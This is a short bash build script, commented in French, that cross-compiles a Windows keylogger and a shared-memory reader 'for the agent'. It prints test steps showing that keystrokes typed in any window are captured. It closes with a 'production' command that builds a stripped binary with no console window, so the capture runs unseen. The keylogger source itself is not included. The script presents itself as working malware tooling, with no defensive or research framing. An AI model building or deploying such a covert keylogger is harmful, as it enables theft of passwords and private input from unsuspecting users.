#!/bin/bash
# ============================================================================
# Build script pour keylogger avec mémoire partagée
# ============================================================================

set -e

echo "============================================"
echo "  Build Keylogger + Reader (Shared Memory)"
echo "============================================"
echo ""

# 1. Compiler le keylogger
echo "[1/2] Compiling keylogger (shared memory version)..."
x86_64-w64-mingw32-gcc keylogger_shmem.c -o keylogger_shmem.exe \
    -DDEBUG_MODE_ENABLED \
    -luser32 \
    -lkernel32 \
    -mconsole

echo "  ✓ keylogger_shmem.exe created"

# 2. Compiler le reader (test pour l'agent)
echo "[2/2] Compiling reader test..."
x86_64-w64-mingw32-gcc reader_test.c -o reader_test.exe \
    -lkernel32 \
    -mconsole

echo "  ✓ reader_test.exe created"

echo ""
echo "============================================"
echo "  BUILD SUCCESSFUL"
echo "============================================"
echo ""
echo "Test instructions:"
echo "  1. Terminal 1: ./keylogger_shmem.exe"
echo "  2. Terminal 2: ./reader_test.exe"
echo "  3. Type some keys in any window"
echo "  4. Watch the reader display the keystrokes"
echo ""
echo "For production (no console):"
echo "  x86_64-w64-mingw32-gcc keylogger_shmem.c -o keylogger.exe -mwindows -O2 -s -luser32 -lkernel32"
echo ""
